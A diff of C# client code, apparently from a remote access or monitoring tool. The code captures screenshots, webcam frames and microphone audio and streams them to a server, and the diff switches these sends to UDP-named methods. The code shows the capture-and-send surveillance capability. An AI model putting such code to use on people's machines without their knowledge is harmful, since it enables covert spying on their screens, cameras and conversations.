@@ -87,8 +87,8 @@ namespace Client
             };
 
             var screenshot = GClass.CaptureScreen(Screen.AllScreens[monitoridx]);
-            await client.SendFileBytesWithMeta(screenshot, clientInfo.ToString());
-            await client.SendFileBytesWithMeta(screenshot, clientInfo.ToString());
+            await client.SendUdpFileBytes(screenshot, clientInfo.ToString());
+            await client.SendUdpFileBytes(screenshot, clientInfo.ToString());
             GClass.StartHeartbeat(client);
 
             client.MessageReceived += async (s, e) =>
@@ -238,7 +238,7 @@ namespace Client
                     try
                     {
                         var shot = GClass.CaptureScreen(Screen.AllScreens[monitoridx], quality);
-                        await client.SendFileBytesWithMeta(shot, new JObject
+                        await client.SendFileViaUdp(shot, new JObject
                         {
                             ["msg"] = "screenshot",
                             ["monitors"] = Screen.AllScreens.Length,
@@ -329,7 +329,7 @@ namespace Client
                             var jpegCodec = GClass.GetEncoder(ImageFormat.Jpeg);
                             currentFrame.Save(ms, jpegCodec, encoderParams);
 
-                            await client.SendFileBytesWithMeta(ms.ToArray(), new JObject
+                            await client.SendFileViaUdp(ms.ToArray(), new JObject
                             {
                                 ["msg"] = "camframe",
                                 ["cameras"] = devices.Count
@@ -392,7 +392,7 @@ namespace Client
                 var pcm = new byte[e.BytesRecorded];
                 Array.Copy(e.Buffer, 0, pcm, 0, e.BytesRecorded);
 
-                _ = client.SendFileBytesWithMeta(pcm, new JObject
+                _ = client.SendFileViaUdp(pcm, new JObject
                 {
                     ["msg"] = "micaudio",
                     ["microphones"] = deviceCount
